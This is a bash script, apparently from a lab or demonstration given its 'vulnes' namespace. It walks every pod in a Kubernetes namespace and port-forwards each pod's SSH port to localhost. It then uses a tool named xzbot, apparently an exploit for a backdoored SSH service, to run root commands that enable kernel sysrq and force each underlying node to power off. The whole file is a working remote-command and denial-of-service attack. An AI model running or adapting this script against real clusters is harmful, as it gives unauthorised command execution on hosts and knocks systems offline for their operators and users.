#!/bin/bash
for pod in $(kubectl -n vulnes get pods -o jsonpath='{.items[*].metadata.name}'); do
    node=$(kubectl -n vulnes get pod ${pod} -o jsonpath='{.spec.nodeName}')
    echo "Attempting to shutdown node ${node}..."
    # Port forward in background
    kubectl -n vulnes port-forward ${pod} 2225:22 > /dev/null 2>&1 &
    temp_pid=$!
    sleep 15
    # Enable sysrq
    $HOME/go/bin/xzbot -addr 127.0.0.1:2225 -cmd 'echo 1 > /proc/sys/kernel/sysrq' > /dev/null 2>&1
    echo "Sysrq enabled in node ${node}..."
    # Shutdown the host
    $HOME/go/bin/xzbot -addr 127.0.0.1:2225 -cmd 'echo o > /proc/sysrq-trigger' > /dev/null 2>&1 &
    # Kill the port forward
    sleep 5
    kill $temp_pid > /dev/null 2>&1
    echo "Node ${node} is down."
    sleep 3
done
